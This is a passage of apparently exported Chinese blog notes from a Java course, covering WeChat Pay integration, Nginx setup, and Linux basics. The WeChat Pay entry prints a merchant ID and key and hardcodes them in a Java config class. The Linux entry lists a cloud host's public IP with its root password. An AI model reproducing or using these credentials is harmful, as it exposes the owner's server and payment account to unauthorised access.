class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-3-将配置文件设置到逆向工程的maven插件"><a href="#7-3-将配置文件设置到逆向工程的maven插件" class="headerlink" title="7.3 将配置文件设置到逆向工程的maven插件"></a>7.3 将配置文件设置到逆向工程的maven插件</h4><p><img src="imgs/1618556118954.png" alt="1618556118954"></p><h4 id="7-4-执行逆向生成"><a href="#7-4-执行逆向生成" class="headerlink" title="7.4 执行逆向生成"></a>7.4 执行逆向生成</h4><p><img src="imgs/1618556367149.png" alt="1618556367149"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信支付</title>
      <link href="/posts/13.html"/>
      <url>/posts/13.html</url>
      
        <content type="html"><![CDATA[<h2 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h2><blockquote><p>通过微信平台为商家提供代收款服务</p></blockquote><h4 id="1-微信支付业务—商户注册微信支付业务"><a href="#1-微信支付业务—商户注册微信支付业务" class="headerlink" title="1.微信支付业务—商户注册微信支付业务"></a>1.微信支付业务—商户注册微信支付业务</h4><p><a href="https://pay.weixin.qq.com/index.php/core/home/login?return_url=/">https://pay.weixin.qq.com/index.php/core/home/login?return_url=%2F</a></p><ul><li>商户编号：1497984412</li><li>商户账号AppID：wx632c8f211f8122c6</li><li>商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC</li></ul><h4 id="2-申请支付订单—商户向支付平台申请支付链接"><a href="#2-申请支付订单—商户向支付平台申请支付链接" class="headerlink" title="2.申请支付订单—商户向支付平台申请支付链接"></a>2.申请支付订单—商户向支付平台申请支付链接</h4><blockquote><p>支付订单，并不是用户提交的商品订单，而是商户向微信支付平台申请的支付链接</p></blockquote><h6 id="2-1-导入微信支付的依赖"><a href="#2-1-导入微信支付的依赖" class="headerlink" title="2.1 导入微信支付的依赖"></a>2.1 导入微信支付的依赖</h6><ul><li>wxpay的maven依赖</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.github.wxpay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>wxpay-sdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="2-2-创建微信支付配置类，配置商户信息"><a href="#2-2-创建微信支付配置类，配置商户信息" class="headerlink" title="2.2 创建微信支付配置类，配置商户信息"></a>2.2 创建微信支付配置类，配置商户信息</h6><ul><li>创建一类，实现WxPayConfig接口</li><li>重写三分方法，分别设置商户AppID\商户ID\商户密钥</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyPayConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WXPayConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAppID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"wx632c8f211f8122c6"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMchID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"1497984412"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">InputStream</span> <span class="token function">getCertStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getHttpConnectTimeoutMs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getHttpReadTimeoutMs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="2-3-设置支付订单的参数"><a href="#2-3-设置支付订单的参数" class="headerlink" title="2.3 设置支付订单的参数"></a>2.3 设置支付订单的参数</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">,</span><span class="token string">"咪咪萧条"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//商品描述</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"out_trade_no"</span><span class="token punctuation">,</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//使用当前用户订单的编号作为当前支付交易的交易号</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fee_type"</span><span class="token punctuation">,</span><span class="token string">"CNY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//支付币种</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"total_fee"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//支付金额</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"trade_type"</span><span class="token punctuation">,</span><span class="token string">"NATIVE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//交易类型</span>data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"notify_url"</span><span class="token punctuation">,</span><span class="token string">"/pay/success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//设置支付完成时的回调方法接口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="2-4-申请支付链接"><a href="#2-4-申请支付链接" class="headerlink" title="2.4 申请支付链接"></a>2.4 申请支付链接</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">WXPay</span> wxPay <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WXPay</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyPayConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> resp <span class="token operator">=</span> wxPay<span class="token punctuation">.</span><span class="token function">unifiedOrder</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//发送请求</span>orderInfo<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"payUrl"</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"code_url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx</title>
      <link href="/posts/15.html"/>
      <url>/posts/15.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、Nginx介绍"><a href="#一、Nginx介绍" class="headerlink" title="一、Nginx介绍"></a>一、Nginx介绍</h2><h4 id="1-1-为什么要使用Nginx"><a href="#1-1-为什么要使用Nginx" class="headerlink" title="1.1 为什么要使用Nginx"></a>1.1 为什么要使用Nginx</h4><h6 id="1-1-静态资源访问"><a href="#1-1-静态资源访问" class="headerlink" title="1.1 静态资源访问"></a>1.1 静态资源访问</h6><blockquote><p>前端项目在进行服务器部署的时候，如果基于tomcat则不能满足并发的需求，因此我们需要一种能够处理更高并发的适用于静态资源的服务器</p></blockquote><h6 id="1-2-代理服务器-负载均衡"><a href="#1-2-代理服务器-负载均衡" class="headerlink" title="1.2 代理服务器-负载均衡"></a>1.2 代理服务器-负载均衡</h6><h4 id="1-2-Nginx介绍"><a href="#1-2-Nginx介绍" class="headerlink" title="1.2 Nginx介绍"></a>1.2 Nginx介绍</h4><blockquote><p><em>Nginx</em> (engine x) 是一个高性能的HTTP和反向代理web服务器</p><ul><li>Nginx 是基于HTTP协议的请求/响应（部署web项目）  —-    静态资源服务器</li><li>Nginx可以作为反向代理服务器    —-   负载均衡服务器(代理服务器)</li></ul></blockquote><p>Nginx特点：</p><ul><li>稳定性极强，可以实现7*24不间断运行</li><li>提供简洁、直观的配置</li><li>占用内存很小、并发能力很强（5w+）</li></ul><h2 id="二、Nginx下载、安装及配置"><a href="#二、Nginx下载、安装及配置" class="headerlink" title="二、Nginx下载、安装及配置"></a>二、Nginx下载、安装及配置</h2><h4 id="2-1-windows环境"><a href="#2-1-windows环境" class="headerlink" title="2.1 windows环境"></a>2.1 windows环境</h4><h6 id="2-1-1下载"><a href="#2-1-1下载" class="headerlink" title="2.1 .1下载"></a>2.1 .1下载</h6><p><a href="http://nginx.org/en/download.html">http://nginx.org/en/download.html</a></p><h6 id="2-1-2-解压到指定目录"><a href="#2-1-2-解压到指定目录" class="headerlink" title="2.1.2 解压到指定目录"></a>2.1.2 解压到指定目录</h6><p>解压即可</p><h6 id="2-1-3-运行及访问"><a href="#2-1-3-运行及访问" class="headerlink" title="2.1.3 运行及访问"></a>2.1.3 运行及访问</h6><ul><li><p>执行根路径下的nginx.exe</p><p><img src="imgs/1620959194204.png" alt="1620959194204"></p></li><li><p>nginx 默认端口 80,所以直接访问 ： <a href="http://localhost/">http://localhost</a></p><p><img src="imgs/1620959305130.png" alt="1620959305130"></p></li></ul><h4 id="2-2-Linux环境"><a href="#2-2-Linux环境" class="headerlink" title="2.2 Linux环境"></a>2.2 Linux环境</h4><h2 id="三、Nginx配置"><a href="#三、Nginx配置" class="headerlink" title="三、Nginx配置"></a>三、Nginx配置</h2><ul><li><p>配置文件说明</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">#user  nobody;# 配置处理器个数（应不大于cpu核心数）worker_processes  1;# 配置nginx运行日志文件error_log  logs/error.log;# 配置Nginx进程的进程号的存储文件# pid        logs/nginx.pid;# 配置nginx连接数，数值越大并发能力越强events {    worker_connections  2000;}http {    include       mime.types;    default_type  application/octet-stream;    sendfile        on;    keepalive_timeout  65;    server {# 配置nginx端口号        listen       80;        server_name  localhost;# 地址映射        #location / {        #    root   html;        #    index  index.html index.htm;        #} location / {            root   fmall-static;            index  index.html index.htm;        }       # 指定错误页面        error_page   500 502 503 504  /50x.html;        location = /50x.html {            root   html;        }          }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="四、锋迷商城—前端部署"><a href="#四、锋迷商城—前端部署" class="headerlink" title="四、锋迷商城—前端部署"></a>四、锋迷商城—前端部署</h2><ul><li><p>安装Nginx</p></li><li><p>将前端项目fmall-static拷贝到nginx的根目录</p></li><li><p>修改nginx.conf：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">location / {root   fmall-static;index  index.html index.htm;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/posts/14.html"/>
      <url>/posts/14.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、Linux介绍"><a href="#一、Linux介绍" class="headerlink" title="一、Linux介绍"></a>一、Linux介绍</h2><blockquote><p>学习背景：Java项目生产环境绝大多数都是基于Linux进行搭建的</p></blockquote><h4 id="1-1-Linux系统介绍"><a href="#1-1-Linux系统介绍" class="headerlink" title="1.1 Linux系统介绍"></a>1.1 Linux系统介绍</h4><ul><li>Linux和windows一样是一个操作系统（就如同android和ios手机系统一样）</li><li>Linux是一套免费使用、可以自由传播的类unix操作系统</li><li>Linux可以支持多用户、多任务、支持多线程及多CPU的操作系统</li><li>Linux通常作为专用服务器系统（应用服务器、数据库服务器）使用——Java</li></ul><h4 id="1-2-Linux系统特点"><a href="#1-2-Linux系统特点" class="headerlink" title="1.2 Linux系统特点"></a>1.2 Linux系统特点</h4><ul><li>系统稳定性比windows要好（宕机概率比较低）</li><li>完全开源、用户可以进行自由的系统裁剪、灵活性高、使用成本低</li><li>Linux核心防火墙组件性能高、配置简单、安全性高</li><li>Linux提供了纯命令行系统（也可以带有界面）、进一步减小系统本身的开销</li><li>Linux使用非常广泛、技术社区比较发达、学习资源也很丰富</li><li>综上，Linux比windows更适合用于服务器系统</li></ul><h4 id="1-3-Linux系统版本"><a href="#1-3-Linux系统版本" class="headerlink" title="1.3 Linux系统版本"></a>1.3 Linux系统版本</h4><ul><li><p><code>RedHat</code> （RedHat公司发行的Linux版本：效率高、扩展性好、高可靠性）</p></li><li><p>SUSE （德国的SUSE公司发行的版本）</p></li><li><p>红旗Linux</p></li><li><p><code>CentOS</code> （基于RedHat源码编译而成、完全开源）</p></li><li><p>DEbian（有很对社区进行维护的非官方版本，商业可用性不高）</p></li><li><p><code>Ubuntu</code>（乌班图，基于DEbian的发行，提供了优化后的桌面系统）</p></li></ul><h2 id="二、虚拟机"><a href="#二、虚拟机" class="headerlink" title="二、虚拟机"></a>二、虚拟机</h2><blockquote><p>如何获取一个Linux操作系统？</p><ul><li>基于硬件安装Linux（双系统）</li><li>安装虚拟机，基于虚拟机安装linux系统</li><li>租用云主机（linux）</li></ul></blockquote><h4 id="2-1-虚拟机介绍"><a href="#2-1-虚拟机介绍" class="headerlink" title="2.1 虚拟机介绍"></a>2.1 虚拟机介绍</h4><blockquote><p>使用软件模拟硬件环境——从当前的计算机资源中分离出一部分可独立运行的资源</p></blockquote><p><img src="imgs/1620789942172.png" alt="1620789942172"></p><h4 id="2-2-下载安装vmware"><a href="#2-2-下载安装vmware" class="headerlink" title="2.2 下载安装vmware"></a>2.2 下载安装vmware</h4><blockquote><p>详细步骤参考<code>VMware workstation下载、安装、激活.pdf</code>文档</p></blockquote><h6 id="2-2-1-下载"><a href="#2-2-1-下载" class="headerlink" title="2.2.1 下载"></a>2.2.1 下载</h6><p><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">Download VMware Workstation Pro</a></p><p><img src="imgs/1620790310465.png" alt="1620790310465"></p><h6 id="2-2-2-安装"><a href="#2-2-2-安装" class="headerlink" title="2.2.2 安装"></a>2.2.2 安装</h6><p>傻瓜式安装</p><p>安装完成之后重启计算机</p><h6 id="2-2-3-激活"><a href="#2-2-3-激活" class="headerlink" title="2.2.3 激活"></a>2.2.3 激活</h6><p>计算机重启之后，第一次运行vmware时输入序列号进行激活</p><h4 id="2-3-创建虚拟机"><a href="#2-3-创建虚拟机" class="headerlink" title="2.3 创建虚拟机"></a>2.3 创建虚拟机</h4><ul><li><p>桥接网络和转换网络</p><table><thead><tr><th>桥接网络</th></tr></thead><tbody><tr><td><img src="imgs/1620792001168.png" alt="1620792001168"></td></tr></tbody></table><table><thead><tr><th>转换网络</th></tr></thead><tbody><tr><td><img src="imgs/1620792027999.png" alt="1620792027999"></td></tr></tbody></table></li></ul><h4 id="2-4-安装CentOS"><a href="#2-4-安装CentOS" class="headerlink" title="2.4 安装CentOS"></a>2.4 安装CentOS</h4><p>参考<code>虚拟机创建及linux安装.pdf</code></p><ul><li><p>打开终端：application – Terminal(终端)</p></li><li><p>查看网络配置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ifconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>切换用户：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">su username## 输入密码  （低级权限用户切换到高级权限用户是需要输入密码的）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启Linux</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>系统状态切换</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">## 切换到命令行模式init 3## 切换到桌面模式init 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="三、Linux远程工具"><a href="#三、Linux远程工具" class="headerlink" title="三、Linux远程工具"></a>三、Linux远程工具</h2><h4 id="3-1-Linux资源管理工具"><a href="#3-1-Linux资源管理工具" class="headerlink" title="3.1 Linux资源管理工具"></a>3.1 Linux资源管理工具</h4><blockquote><p>xftp   SSH</p></blockquote><h6 id="3-1-1-xftp下载"><a href="#3-1-1-xftp下载" class="headerlink" title="3.1.1 xftp下载"></a>3.1.1 xftp下载</h6><p><a href="https://www.netsarang.com/zh/xftp-download/">https://www.netsarang.com/zh/xftp-download/</a></p><h6 id="3-1-2-安装"><a href="#3-1-2-安装" class="headerlink" title="3.1.2 安装"></a>3.1.2 安装</h6><p>傻瓜式安装</p><h6 id="3-1-3-创建xftp与linux的连接"><a href="#3-1-3-创建xftp与linux的连接" class="headerlink" title="3.1.3 创建xftp与linux的连接"></a>3.1.3 创建xftp与linux的连接</h6><p><img src="imgs/1620807665737.png" alt="1620807665737"></p><h4 id="3-2-Linux远程终端"><a href="#3-2-Linux远程终端" class="headerlink" title="3.2 Linux远程终端"></a>3.2 Linux远程终端</h4><h6 id="3-2-1-xshell下载"><a href="#3-2-1-xshell下载" class="headerlink" title="3.2.1 xshell下载"></a>3.2.1 xshell下载</h6><h6 id="3-2-2-xshell安装"><a href="#3-2-2-xshell安装" class="headerlink" title="3.2.2 xshell安装"></a>3.2.2 xshell安装</h6><p>傻瓜式安装</p><h6 id="3-2-3-创建xshell与Linux的连接"><a href="#3-2-3-创建xshell与Linux的连接" class="headerlink" title="3.2.3 创建xshell与Linux的连接"></a>3.2.3 创建xshell与Linux的连接</h6><p><img src="imgs/1620808591611.png" alt="1620808591611"></p><p><img src="imgs/1620808623278.png" alt="1620808623278"></p><h2 id="四、云主机"><a href="#四、云主机" class="headerlink" title="四、云主机"></a>四、云主机</h2><blockquote><p>使用虚拟机的限制：</p><p>1.虚拟机共享宿主机的资源</p><p>2.虚拟机的故障率比较高</p><p>3.虚拟机也是基于内网的网络</p></blockquote><h4 id="4-1-什么是云主机？"><a href="#4-1-什么是云主机？" class="headerlink" title="4.1 什么是云主机？"></a>4.1 什么是云主机？</h4><ul><li>云主机就是使用一种虚拟化技术在一台主机中虚拟出多个“独立”的主机部分，能够实现单机多用户，每个部分都可以作为单独的主机来管理和使用。</li></ul><p><img src="imgs/1620809732934.png" alt="1620809732934"></p><h4 id="4-2-购买云主机"><a href="#4-2-购买云主机" class="headerlink" title="4.2 购买云主机"></a>4.2 购买云主机</h4><ul><li>推荐阿里和腾讯</li><li>腾讯：云+校园  <a href="https://cloud.tencent.com/act/campus">https://cloud.tencent.com/act/campus</a></li><li>阿里：24岁 <a href="https://developer.aliyun.com/plan/grow-up">https://developer.aliyun.com/plan/grow-up</a></li></ul><h4 id="4-3-云主机管理"><a href="#4-3-云主机管理" class="headerlink" title="4.3 云主机管理"></a>4.3 云主机管理</h4><ul><li>阿里云/腾讯云都提供了一个管理系统，用户对云主机进行配置和管理<ul><li>阿里云控制中心： <a href="https://console.aliyun.com/">https://console.aliyun.com</a></li></ul></li></ul><h6 id="4-3-1-轻量级服务器管理"><a href="#4-3-1-轻量级服务器管理" class="headerlink" title="4.3.1 轻量级服务器管理"></a>4.3.1 轻量级服务器管理</h6><ul><li><p>常规管理</p><p><img src="imgs/1620812603617.png" alt="1620812603617"></p></li><li><p>防火墙设置</p><p><img src="imgs/1620812835453.png" alt="1620812835453"></p></li></ul><h6 id="4-3-2-ECS服务器管理"><a href="#4-3-2-ECS服务器管理" class="headerlink" title="4.3.2 ECS服务器管理"></a>4.3.2 ECS服务器管理</h6><ul><li><p>常规管理</p><p><img src="imgs/1620813130151.png" alt="1620813130151"></p></li><li><p>安全组管理（防火墙）</p><p><img src="imgs/1620813198254.png" alt="1620813198254"></p><p><img src="imgs/1620813453002.png" alt="1620813453002"></p></li></ul><h4 id="4-4-远程工具连接云主机"><a href="#4-4-远程工具连接云主机" class="headerlink" title="4.4 远程工具连接云主机"></a>4.4 远程工具连接云主机</h4><ul><li>云主机公网IP：47.110.38.44</li><li>root帐号的密码：Lxl19950902</li></ul><h6 id="4-4-1-xftp远程连接云主机"><a href="#4-4-1-xftp远程连接云主机" class="headerlink" title="4.4.1 xftp远程连接云主机"></a>4.4.1 xftp远程连接云主机</h6><h6 id="4-4-2-xshell远程连接云主机"><a href="#4-4-2-xshell远程连接云主机" class="headerlink" title="4.4.2 xshell远程连接云主机"></a>4.4.2 xshell远程连接云主机</h6><h2 id="五、Linux常用操作指令"><a href="#五、Linux常用操作指令" class="headerlink" title="五、Linux常用操作指令"></a>五、Linux常用操作指令</h2><h4 id="5-1-如何学习Linux？"><a href="#5-1-如何学习Linux？" class="headerlink" title="5.1 如何学习Linux？"></a>5.1 如何学习Linux？</h4><ul><li>Linux的文件系统</li><li>Linux文件管理<ul><li>目录：进退、创建、删除</li><li>文件：创建与编辑、复制和粘贴、移动和删除、压缩和解压</li></ul></li><li>用户及权限的管理<ul><li>在windows中，通常都是自己使用自己的机器，很少出现多个人使用同一台机器的情况，所以在我们日常使用windows都只有一个账号，也就不会关注不同账号之间的权限问题</li><li>但是在linux系统使用过程中，通常是作为服务器系统使用，所以通常都会在一个Linux系统中创建多个不同权限的用户（root就是一个超级管理员身份的用户）</li></ul></li><li>软件管理<ul><li>软件安装</li><li>软件配置</li><li>软件卸载</li></ul></li></ul><h4 id="5-2-Linux文件系统"><a href="#5-2-Linux文件系统" class="headerlink" title="5.2 Linux文件系统"></a>5.2 Linux文件系统</h4><blockquote><p>Linux系统不同于windows，在Linux系统中没有盘符，根路径用”/“表示</p></blockquote><pre class="line-numbers language-none"><code class="language-none">[root@theo ~]# cd /[root@theo /]# lsbin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var[root@theo /]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td>bin</td><td>系统文件夹，存放linux的系统文件</td></tr><tr><td>sbin</td><td>超级管理员的系统命令</td></tr><tr><td>boot</td><td>系统所需目录（系统启动相关文件）</td></tr><tr><td><code>etc</code></td><td>存放系统配置相关的文件（环境变量）</td></tr><tr><td>lib/lib64</td><td>library 存放系统所需的依赖库</td></tr><tr><td><code>home</code></td><td>一般用户所在文件夹（此目录包含了所有普通用户的用户目录）</td></tr><tr><td><code>root</code></td><td>超级管理员目录（root用户目录）</td></tr><tr><td>media</td><td>媒体(光驱)</td></tr><tr><td>mnt</td><td>挂载（U盘、移动硬盘）</td></tr><tr><td>tmp、opt</td><td>临时的文件存储目录，比如日志存储在tmp或者opt中</td></tr><tr><td><code>usr</code></td><td>用户目录，我们通常安装的软件、用户的一些文件都在此目录下</td></tr><tr><td>run   srv  sys  var proc dev</td><td>系统相关目录</td></tr></tbody></table><h4 id="5-3-Linux系统指令语法"><a href="#5-3-Linux系统指令语法" class="headerlink" title="5.3 Linux系统指令语法"></a>5.3 Linux系统指令语法</h4><p>示例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tar -zcvf b.tar otp_src_20.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>指令 [<code>选项</code>] <code>参数</code></p><ul><li>指令，决定了当前的动作</li><li>选项，可有可无（对于有些指令，选项是必须的）<ul><li>“-” 表示短选项，一个字母代表一个选项</li><li>“–”表示长选项，一个单词代表一个选项</li></ul></li><li>参数，指令正常执行所需的数据</li></ul></blockquote><blockquote><p>man指令（manual:说明书）</p><ul><li>man 指令</li><li>点击q退出说明书</li></ul></blockquote><h4 id="5-4-文件管理"><a href="#5-4-文件管理" class="headerlink" title="5.4 文件管理"></a>5.4 文件管理</h4><h5 id="5-4-1-目录操作指令"><a href="#5-4-1-目录操作指令" class="headerlink" title="5.4.1 目录操作指令"></a>5.4.1 目录操作指令</h5><ul><li><p><strong>进入文件夹及退出文件夹</strong></p><ul><li><p><code>cd</code> 目录名称     进入指定的目录（当我们输入目录名称的时候，可以通过Tab进行自动补全）</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">## 进入到Linux系统跟路径</span><span class="token attr-name">cd</span> <span class="token attr-value">/</span><span class="token comment">## 进入到当前用户的目录（如果是root用户则进入到/root,如果是其他用户则进入到/home/中的用户目录）</span><span class="token attr-name">cd</span> <span class="token attr-value">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>cd .. 退出当前目录</p></li><li><p><code>pwd</code>     （print working directory）查看当前路径</p></li><li><p>绝对路径和相对路径</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">##绝对路径： cd 指令参数的路径如果是以/开头，表示从系统的根路径下去查找cd /path##相对路径：cd 指令参数的路径如果没有/，则表示从当前目录去查找 cd path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>显示当前目录下的文件列表</p><ul><li><code>ls</code> 显示文件列表</li><li>ls -a 显示当前目录下所有文件列表（包括隐藏文件）</li><li>ls -l 显示当前目录下文件列表的详细信息</li><li>ll  显示文件列表详细信息（相当于  ls -l）</li></ul></li><li><p>目录的创建和删除</p><ul><li><code>mkdir</code> 目录名    在当前目录下创建新的目录（创建一级目录）</li><li><code>mkdir -p</code> 目录A/目录B   连同父级目录一起创建 创建目录</li><li><code>rm -r</code> 目录        删除当前目录（需要确认）</li><li><code>rmdir</code> 目录  专门用于删除目录</li><li><code>rm -rf</code> 目录      删除当前目录（强制删除，无需确认）<ul><li>-r   recursive  递归（删除目录及目录中的内容）</li><li>-f  force 强制</li></ul></li></ul></li></ul><h5 id="5-4-2-文件操作指令"><a href="#5-4-2-文件操作指令" class="headerlink" title="5.4.2 文件操作指令"></a>5.4.2 文件操作指令</h5><ul><li><p>创建和修改文件</p><ul><li><p><code>vi</code> （visual） 文件编辑</p></li><li><p><code>vim</code> （visual improved） 增强文件编辑</p><pre 